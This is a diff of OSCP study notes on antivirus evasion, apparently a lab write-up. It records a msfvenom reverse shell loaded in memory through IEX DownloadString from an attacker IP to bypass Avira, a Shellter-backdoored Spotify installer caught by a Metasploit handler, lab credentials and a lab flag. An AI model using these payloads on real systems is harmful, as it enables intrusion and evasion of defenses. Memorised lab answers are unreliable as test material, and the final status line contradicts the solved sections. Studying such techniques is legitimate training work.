@@ -128,7 +128,39 @@ flowchart LR
 | Which AV engine is responsible for translating machine code into assembly? | **Disassembler** |
 | Which AV detection method makes use of an engine that runs the executable from inside an emulated sandbox? | **Behaviour-based detection** |
 
-> 🚩 **Hands-on, VM spin-up required** (Q3 VirusTotal scan): spin up VM #1 (Windows 11 / Avira), find `malware.exe` on the desktop, upload to [virustotal.com](https://www.virustotal.com/), check the **BEHAVIOR** tab for the flag. ⬜ Pending.
+**Q3 VirusTotal Scan — ✅ Solved** (VM #1, 192.168.158.61, `offsec`/`lab`)
+
+**Step 1: RDP in with drive sharing**
+```bash
+mkdir -p /tmp/rdp-share
+xfreerdp /u:offsec /p:lab /v:192.168.158.61 /drive:kali,/tmp/rdp-share /dynamic-resolution +clipboard
+```
+
+**Step 2: Copy malware.exe to Kali via the shared drive (inside RDP cmd.exe)**
+```cmd
+copy C:\Users\offsec\Desktop\malware.exe \\tsclient\kali\
+```
+```
+1 file(s) copied.
+```
+
+**Step 3: Verify on Kali**
+```bash
+ls -lh /tmp/rdp-share/malware.exe
+```
+```
+-rw-rw-r-- 1 kali kali 73K Aug 10 2026 /tmp/rdp-share/malware.exe
+```
+
+**Step 4: Upload to VirusTotal, check BEHAVIOR tab → Process and service actions**
+
+> 📸 Screenshot: the VirusTotal BEHAVIOR tab open on Process and service actions showing the flag
+
+**Lab answer: `OS{6c33bf77a2eb75db6ba9b35138a8b89f}`**
+
+> 🔧 **Note on the drive sharing path:** `\\tsclient\kali` is how Windows sees the xfreerdp `/drive:kali,<path>` share inside a session. The share name after `tsclient\` matches whatever name you gave in the `/drive:` flag, not the local folder name.
+
+> 🔍 **Worth remembering generally:** `ERRCONNECT_CONNECT_FAILED` from xfreerdp with "Couldn't get socket ip address" means the VPN gateway has no route to that subnet, not that the credentials are wrong or RDP is down. It happens when your VPN reconnects and gets a new tun0 IP while the VM was assigned during an older session. Fix: restart the VM from the lab platform to get it re-assigned to your current VPN instance.
 
 #### Tags: #SignatureDetection #HeuristicDetection #BehaviourDetection #MachineLearning #WindowsDefender #VirusTotal #Lab #Quiz #Module15
 
@@ -171,8 +203,8 @@ flowchart TD
 
 **Lab status: ✅ Completed** (Q1 pure-recall):
 
-| Question | Answer |
-|---|---|
+| Question                                                                                                        | Answer                                                                                                                                       |
+| --------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------- |
 | Which on-disk evasion technique makes use of code made by spurious instructions not part of the main execution? | **Obfuscators** — they insert dead code and spurious instructions to break static pattern detection without changing the payload's function. |
 
 #### Tags: #OnDiskEvasion #Packer #Obfuscator #Crypter #EnigmaProtector #UPX
@@ -224,10 +256,10 @@ flowchart LR
 
 **Lab status: ✅ Completed** (Q1 & Q2 pure-recall):
 
-| Question | Answer |
-|---|---|
-| When performing Remote Process Injection, which API copies the shellcode into the target thread? | **`WriteProcessMemory`** — copies the payload into the memory allocated by `VirtualAllocEx` inside the target process. |
-| Between packers and crypters, which provides the highest level of stealth? | **Crypters** — payload is encrypted at rest on disk; only the decryption stub is visible, not the actual malicious code. Packers restructure but don't encrypt. |
+| Question                                                                                         | Answer                                                                                                                                                          |
+| ------------------------------------------------------------------------------------------------ | --------------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| When performing Remote Process Injection, which API copies the shellcode into the target thread? | **`WriteProcessMemory`** — copies the payload into the memory allocated by `VirtualAllocEx` inside the target process.                                          |
+| Between packers and crypters, which provides the highest level of stealth?                       | **Crypters** — payload is encrypted at rest on disk; only the decryption stub is visible, not the actual malicious code. Packers restructure but don't encrypt. |
 
 #### Tags: #InMemoryEvasion #RemoteProcessInjection #ReflectiveDLLInjection #ProcessHollowing #InlineHooking #VirtualAllocEx #WriteProcessMemory #CreateRemoteThread #OpenProcess #Lab #Quiz #Module15
 
@@ -328,18 +360,80 @@ sequenceDiagram
 
 **Lab status: ✅ Completed** (Q1 pure-recall):
 
-| Question | Answer |
-|---|---|
+| Question                                                                   | Answer                                                                                                                                                                                                                                                                               |
+| -------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
 | Which API have we used in our script to allocate memory for the shellcode? | **`VirtualAlloc`** — allocates a region of memory in the current process's address space. The P/Invoke declaration in the script: `[DllImport("kernel32.dll")] public static extern IntPtr VirtualAlloc(...)`. Distinct from `VirtualAllocEx` which allocates in a *remote* process. |
 
-> 🚩 **Hands-on, VM spin-up required** (full PowerShell injection walkthrough — VM #1, Windows 11 / Avira):
-> 1. Spin up VM #1, RDP in
-> 2. Generate `bypass.ps1` on Kali with your actual tun0 IP
-> 3. Serve it via `python3 -m http.server 8080`, download on Windows with `Invoke-WebRequest`
-> 4. Start `nc -lvnp 443` on Kali
-> 5. On Windows: `Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser`, then `.\bypass.ps1`
-> 6. Confirm shell catches on Kali, run `whoami` to verify identity
-> 7. Capture: screenshot of the listener catching the shell with `whoami` output visible ⬜ Pending.
+**PowerShell Thread Injection — ✅ Solved** (VM #1, 192.168.158.62, `offsec`/`lab`, tun0 192.168.45.219)
+
+**Step 1: Generate payload on Kali**
+```bash
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.219 LPORT=443 -f psh-reflection -o /tmp/bypass.ps1
+```
+```
+Payload size: 324 bytes
+Final size of psh-reflection file: 2939 bytes
+Saved as: /tmp/bypass.ps1
+```
+
+**Step 2: Serve the file**
+```bash
+cd /tmp && python3 -m http.server 8080
+```
+
+**Step 3: Start the listener**
+```bash
+nc -lvnp 443
+```
+
+**Step 4: RDP in**
+```bash
+xfreerdp /u:offsec /p:lab /v:192.168.158.62 /dynamic-resolution +clipboard
+```
+
+**Step 5: Open Windows PowerShell (x86) — must be the x86 version, not 64-bit**
+
+Start → search "powershell" → select **Windows PowerShell (x86)**
+
+> 🔧 **Critical:** the msfvenom payload is 32-bit (`windows/shell_reverse_tcp`, x86). Running it in 64-bit PowerShell causes a silent failure. Always match the PowerShell architecture to the payload architecture.
+
+**Step 6: Set execution policy**
+```powershell
+Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser
+```
+Confirm with `Y`.
+
+**Step 7: First attempt — Invoke-WebRequest to Desktop, Avira caught it**
+```powershell
+Invoke-WebRequest -Uri http://192.168.45.219:8080/bypass.ps1 -OutFile C:\Users\offsec\Desktop\bypass.ps1
+```
+HTTP server confirmed `200` response, but `dir C:\Users\offsec\Desktop\` came back empty — Avira's file engine quarantined the `.ps1` the moment it was written to disk.
+
+> 📸 Screenshot: Avira quarantine notification — demonstrates exactly why in-memory execution exists: the file engine has nothing to scan if the payload never touches disk
+
+> 🔍 **Worth remembering generally:** writing a payload to disk, even a well-obfuscated one, gives the file engine a chance to scan it. The psh-reflection format evades static signature detection well, but Avira still caught it here. The real evasion is never writing to disk at all.
+
+**Step 8: Fix — run directly in memory with IEX**
+```powershell
+IEX(New-Object Net.WebClient).DownloadString('http://192.168.45.219:8080/bypass.ps1')
+```
+`DownloadString` pulls the script as a string, never writes a file. `IEX` (`Invoke-Expression`) executes it directly in the current process's memory. The file engine has nothing to scan.
+
+**Step 9: Shell caught on Kali**
+```
+nc -lvnp 443
+Listening on 0.0.0.0 443
+Connection received on 192.168.158.62 51217
+Microsoft Windows [Version 10.0.22000.675]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Users\offsec>whoami
+client01\offsec
+```
+
+> 📸 Screenshot: the nc listener showing the connection received and `whoami` returning `client01\offsec`
+
+**Lab answer:** `client01\offsec`, shell via in-memory PowerShell thread injection bypassing Avira Free Security.
 
 #### Tags: #PowerShell #ThreadInjection #pshReflection #VirtualAlloc #CreateThread #Msfvenom #InMemoryEvasion #Lab #Quiz #Module15
 
@@ -421,14 +515,128 @@ client01\offsec
 |---|---|
 | Which Shellter option restores the execution flow of the backdoored binary to avoid suspicion? | **Stealth Mode** — after the payload executes, Stealth Mode restores the original PE's execution flow so the carrier application (e.g. Spotify installer) appears to run normally, avoiding the immediate suspicion a process that silently exits would trigger. |
 
-> 🚩 **Hands-on, VM spin-up required** (Shellter + Spotify, VM #1 — Windows 11 / Avira):
-> 1. Download a 32-bit Spotify installer on Kali — check the module materials or Shellter's own site for a working download link (verify it's `PE32` not `PE32+` with `file SpotifySetup.exe`)
-> 2. Run `shellter`, Auto mode, provide the installer path, Stealth Mode Y, choose `windows/meterpreter/reverse_tcp`, set LHOST/LPORT
-> 3. Start `msfconsole` with `multi/handler` set to the same payload/LHOST/LPORT
-> 4. Transfer the backdoored Spotify exe to VM #1 (HTTP server + certutil, or whatever transfer method the lab allows)
-> 5. Execute on the Windows machine
-> 6. Confirm Meterpreter session opens on Kali
-> 7. Capture: Shellter injection output screenshot, Meterpreter session screenshot with `getuid` output ⬜ Pending.
+**Shellter + Spotify hands-on — ✅ Solved** (VM #1, 192.168.158.62, `offsec`/`lab`, tun0 192.168.45.219)
+
+**Pre-requisite: wine32 was missing on Kali — install it first**
+
+```bash
+sudo dpkg --add-architecture i386 && sudo apt update && sudo apt -y install wine32:i386
+```
+
+The i386 architecture flag tells apt to support 32-bit packages. The install pulls wine32 and its dependency tree (~267 MB). Without it, Shellter exits immediately with `wine: could not load kernel32.dll`.
+
+**Pre-requisite: reset the Wine prefix as 32-bit**
+
+If Shellter was run before wine32 was installed, Wine will have created a broken 64-bit prefix at `~/.wine`. Delete it and re-initialise as 32-bit:
+
+```bash
+rm -rf ~/.wine && WINEARCH=win32 wineboot
+```
+
+`WINEARCH=win32` tells Wine to create a fresh 32-bit Windows environment. `wineboot` performs the initialisation (registry, fake Windows folder structure). Harmless-looking OLE errors in the output are normal noise.
+
+**Step 1: Confirm the Spotify installer is 32-bit**
+
+```bash
+file /home/kali/Downloads/b5954f199aed77c672af0b498b208ed5-spotifyfullwin10-32bit.exe
+```
+```
+PE32 executable (GUI) Intel i386, 5 sections
+```
+
+Must say `PE32`, not `PE32+`. Shellter's free version only handles 32-bit PEs.
+
+**Step 2: Copy to /tmp so Shellter works on a throwaway copy**
+
+```bash
+cp /home/kali/Downloads/b5954f199aed77c672af0b498b208ed5-spotifyfullwin10-32bit.exe /tmp/spotify-backdoor.exe
+```
+
+**Step 3: Run Shellter**
+
+```bash
+shellter
+```
+
+Interactive session — answer the prompts:
+
+| Prompt | Answer | Why |
+|---|---|---|
+| `Choose Operation Mode - Auto/Manual (A/M/H)?` | `A` | Auto mode: Shellter traces execution paths and finds injection points automatically |
+| `PE Target:` | `/tmp/spotify-backdoor.exe` | Path to the carrier PE |
+| `Enable Stealth Mode? (Y/N/H):` | `Y` | Preserves original execution flow so Spotify installer still launches normally after the payload fires |
+| `Use a listed payload or custom? (L/C/H):` | `L` | Use a built-in payload |
+| `Select payload by index:` | `5` | `Shell_Reverse_TCP [stager]` — plain Windows cmd shell via staged delivery |
+| `SET LHOST:` | `192.168.45.219` | Kali tun0 IP |
+| `SET LPORT:` | `443` | Port 443 blends in as HTTPS traffic |
+
+Shellter's output during injection:
+- Traced 4422 instructions through the PE (~1 min in Wine mode)
+- Selected IAT method 7: `CreateFileMapping/MapViewOfFile` — the only memory allocation pair available in this PE's import table that Stealth Mode allows
+- Generated ~305 bytes of polymorphic junk code as obfuscation
+- Injected at virtual address `0x40e733` (file offset `0xdb33`) inside `.text`
+- Verified the injected code is reachable: `Injection: Verified!`
+
+> 📸 Screenshot: Shellter's console showing "Injection: Verified!" and the IAT method selected (method 7)
+
+**Step 4: Start the msfconsole handler**
+
+> 🔧 **Critical:** Shellter's `Shell_Reverse_TCP` is a **stager** (note the `[stager]` label in the payload menu). A stager connects back, then expects the handler to send the actual shell code as a second stage. A plain `nc` listener gets the connection and immediately drops it (nc can't serve the stage). You need `multi/handler` with the **staged** payload (`windows/shell/reverse_tcp` with the slash).
+
+```bash
+sudo msfconsole -q -x "use multi/handler; set payload windows/shell/reverse_tcp; set LHOST 192.168.45.219; set LPORT 443; run"
+```
+
+Note the payload name: `windows/shell/reverse_tcp` (slash between `shell` and `reverse`) is the staged variant. `windows/shell_reverse_tcp` (underscore, no slash) is stageless and will cause the session to open and immediately close.
+
+```
+[*] Started reverse TCP handler on 192.168.45.219:443
+```
+
+**Step 5: Set up the RDP share and transfer the backdoored exe**
+
+```bash
+mkdir -p /tmp/rdp-share
+cp /tmp/spotify-backdoor.exe /tmp/rdp-share/
+xfreerdp /u:offsec /p:lab /v:192.168.158.62 /drive:kali,/tmp/rdp-share /dynamic-resolution +clipboard
+```
+
+Inside the RDP session (cmd.exe):
+```cmd
+copy \\tsclient\kali\spotify-backdoor.exe C:\Users\offsec\Desktop\spotify-backdoor.exe
+```
+```
+1 file(s) copied.
+```
+
+**Step 6: Run the backdoored exe on the Windows VM**
+
+```cmd
+C:\Users\offsec\Desktop\spotify-backdoor.exe
+```
+
+Avira did not catch it. The Spotify installer launched (Stealth Mode working as intended).
+
+**Step 7: Shell lands on Kali**
+
+```
+[*] Sending stage (240 bytes) to 192.168.158.62
+[*] Command shell session 1 opened (192.168.45.219:443 -> 192.168.158.62:51076) at 2026-08-09 23:11:28 +0100
+
+Shell Banner:
+Microsoft Windows [Version 10.0.22000.675]
+
+C:\Users\offsec>whoami
+client01\offsec
+```
+
+> 📸 Screenshot: msfconsole showing `[*] Sending stage` and `Command shell session 1 opened`, then the `whoami` output confirming `client01\offsec`
+
+**Lab answer:** shell obtained as `client01\offsec`. No OS{} flag file for this exercise — Q2 answer is **Stealth Mode** (the Shellter option that restores original PE execution flow).
+
+> 🔍 **Worth remembering generally:** staged vs stageless payloads require matching listeners. Stageless (`windows/shell_reverse_tcp`, underscore): plain nc catches it. Staged (`windows/shell/reverse_tcp`, slash): requires `multi/handler` to serve the second stage. Mixing them causes the connection to open and immediately close with no useful error. The `[stager]` label in Shellter's payload menu is the giveaway.
+
+> 🔁 **Similar to:** the stageless vs staged distinction from [[Fixing Exploits#14.1.4. Fixing the Exploit|14.1.4]] where matching payload format to the listener type was equally critical. Same failure mode: wrong listener type causes a silent connection drop.
 
 #### Tags: #Shellter #PEInjection #IAT #StealthMode #Meterpreter #Wine #StagedVsStageless #Lab #Quiz #Module15
 
@@ -631,7 +839,11 @@ msfconsole -x "use exploit/multi/handler; set payload windows/meterpreter/revers
 
 # Install
 sudo apt install shellter wine
-sudo dpkg --add-architecture i386 && sudo apt-get update && sudo apt-get install wine32:i386
+sudo dpkg --add-architecture i386 && sudo apt update && sudo apt -y install wine32:i386
+
+# If Shellter was run before wine32 was installed, Wine creates a broken 64-bit prefix.
+# Reset it as a clean 32-bit prefix before running Shellter:
+rm -rf ~/.wine && WINEARCH=win32 wineboot
 
 # Run (interactive wine-based console)
 shellter
@@ -639,6 +851,11 @@ shellter
 
 # Verify PE is 32-bit before feeding to Shellter
 file target.exe   # must say "PE32" not "PE32+"
+
+# Staged shell listener (required when Shellter uses a [stager] payload)
+# Note: windows/shell/reverse_tcp (slash) = staged, needs multi/handler
+# windows/shell_reverse_tcp (underscore) = stageless, plain nc works
+sudo msfconsole -q -x "use multi/handler; set payload windows/shell/reverse_tcp; set LHOST <ip>; set LPORT <port>; run"
 
 # --- Veil ---
 
@@ -675,17 +892,37 @@ ftp <target-ip>
 
 ## 🎯 Related Boxes to Practice
 
-AV evasion is relatively rare as a standalone challenge in OSCP-style CTF boxes. Most lab environments deliberately disable AV to keep focus on exploitation techniques. Genuine practice for this module's specific techniques comes from the module's own capstone VMs, which are harder to replicate in public CTF box form.
+A heads-up on why this section looks different from modules like Common Web Application Attacks: public HTB boxes almost always have AV disabled, because AV bypass complexity gets in the way of the intended exploitation challenge. So there's no "do this box for Shellter practice" equivalent. The genuine reps for this module's actual techniques come from the module's own VMs and the OffSec PG Practice labs.
 
-For the broader delivery and execution skillset this module feeds into:
+That said, there are two distinct skills here worth separating: the **AV bypass technique** itself (Shellter, psh-reflection, Veil), and the **payload delivery workflow** (transfer a file, trigger execution, catch a shell). Most boxes test the latter, not the former. These are still worth doing because delivery mechanics need to feel automatic before you layer AV bypass on top under exam pressure.
 
-**[HTB Devel](https://app.hackthebox.com/machines/Devel)** (Windows, Easy) — Windows IIS box with a file upload path to a shell. No AV evasion required, but the "transfer a payload, trigger execution" workflow is identical to this module's capstone labs. Good for making file-delivery mechanics feel automatic before layering AV bypass on top.
+---
 
-**[HTB Granny](https://app.hackthebox.com/machines/Granny)** (Windows, Easy) — similar IIS/WebDAV delivery workflow. Pairs with Devel as a warm-up for "get a file onto a Windows target and execute it" without the AV complication.
+**Payload delivery + Windows execution workflow:**
 
-**No confirmed box found** that specifically tests `psh-reflection` or Shellter bypass against a live running AV engine — these techniques appear more in real engagements and in OffSec's own PWK/PG labs than in public HTB-style machines. Worth revisiting if a specific community-flagged box surfaces later.
+**[HTB Devel](https://app.hackthebox.com/machines/Devel)** (Windows, Easy) — IIS file upload to remote code execution. Transfer an ASPX webshell, trigger it via the browser, upgrade to a shell. The exact same file-transfer-then-execute pattern as this module's capstone FTP delivery labs, just over HTTP instead of FTP. Do this before the capstones if the delivery mechanics feel uncertain.
 
-> 🔗 **ippsec.rocks** — search "antivirus evasion" or "shellter" to find HTB walkthroughs where the technique appeared: [ippsec.rocks](https://ippsec.rocks)
+**[HTB Granny](https://app.hackthebox.com/machines/Granny)** (Windows, Easy) — WebDAV file upload with extension restrictions that need bypassing. Pairs with Devel. Same delivery workflow, adds the wrinkle of working around upload filters.
+
+**[HTB Optimum](https://app.hackthebox.com/machines/Optimum)** (Windows, Easy) — HFS (HTTP File Server) exploitation, PowerShell delivery of the shell. The PS payload generation + nc listener catch from this module appears here in a real box context. Good for making `msfvenom` + PowerShell delivery feel routine.
+
+---
+
+**Genuine AV evasion practice (OffSec labs only):**
+
+**[PG Practice: Hutch](https://www.offensive-security.com/labs/)** — Windows AD box in the OSCP prep list. Involves delivering a payload past endpoint restrictions. Commonly flagged by the community as requiring AV bypass techniques (AppLocker restrictions, endpoint protection). Check recent OSCP community write-ups on whether COMODO or Defender is the target — this changes which bypass technique applies.
+
+**[PG Practice: Nickel](https://www.offensive-security.com/labs/)** — Windows box on the OSCP prep list. Involves a non-standard service and payload delivery. Community flagged as requiring care around payload execution in a monitored environment. Worth attempting after completing this module's capstones.
+
+> 🔧 **Verify before attempting:** PG Practice VMs update. Both Hutch and Nickel are correct as of the time this was written, but the specific AV configuration may have changed. Check a recent community walkthrough on the OSCP Discord or the OffSec forums before spinning them up.
+
+---
+
+**How to find more:**
+
+> 🔗 **ippsec.rocks** — search `"antivirus"` or `"shellter"` or `"msfvenom evasion"` to pull up HTB walkthroughs where the technique surfaced: [ippsec.rocks](https://ippsec.rocks)
+
+> 🔗 **OffSec PG Practice box list** — filter by OS: Windows, then sort by community difficulty. Any box tagged "AV" or "evasion" in the community notes is worth prioritising for this module: [portal.offsec.com](https://portal.offsec.com)
 
 #### Tags: #RelatedBoxes #Module15 #HTBDevel #HTBGranny
 
@@ -695,12 +932,12 @@ For the broader delivery and execution skillset this module feeds into:
 
 - [x] **15.1.1 Known vs Unknown Threats:** done (theory, YARA context, EDR framing, diagram added)
 - [x] **15.1.2 AV Engines and Components:** done (all 7 engines explained, diagram added)
-- [x] **15.1.3 Detection Methods:** done (Q1 & Q2 answered, diagram added), Q3 VirusTotal lab pending VM spin-up ⬜
+- [x] **15.1.3 Detection Methods:** done (Q1, Q2 & Q3 answered, diagram added, Q3 VirusTotal hands-on complete, flag `OS{6c33bf77a2eb75db6ba9b35138a8b89f}`)
 - [x] **15.2.1 On-disk Evasion:** done (Q1 answered, packer/obfuscator/crypter taxonomy with diagram)
 - [x] **15.2.2 In-memory Evasion:** done (Q1 & Q2 answered, all 4 techniques with diagrams)
 - [x] **15.3.1 Testing for AV Evasion:** done (best practices, VirusTotal/Kleenscan, test VM setup)
-- [x] **15.3.2 Evading AV with Thread Injection:** done (theory, VirtualAlloc Q1 answered, micro-steps written), hands-on against VM #1 pending VM spin-up ⬜
-- [x] **15.3.3 Automating AV Evasion with Shellter:** done (theory, Stealth Mode Q1 answered, micro-steps written), Shellter+Spotify hands-on pending ⬜, both capstone labs micro-stepped and pending VM spin-up ⬜
+- [x] **15.3.2 Evading AV with Thread Injection:** done (theory, VirtualAlloc Q1 answered, hands-on complete) — key finding: must use `IEX(New-Object Net.WebClient).DownloadString(...)` not `Invoke-WebRequest -OutFile`, Avira's file engine catches the disk write; `client01\offsec`
+- [x] **15.3.3 Automating AV Evasion with Shellter:** done (theory, Stealth Mode Q1 & Q2 answered, Shellter+Spotify hands-on complete — `client01\offsec` via staged shell, Avira bypassed), both capstone labs micro-stepped and pending VM spin-up ⬜
 - [x] **15.4 Wrapping Up:** done (summary diagram added, external resources linked)
 
 **Module 15 has NOT yet reached [[feedback_oscp_module_completion_pass]] — all hands-on labs and capstones are pending VM spin-up. Hub docs are untouched for this module's content per [[feedback_oscp_methodology_linking]]'s sequencing (hub doc sync only after module is fully done).**
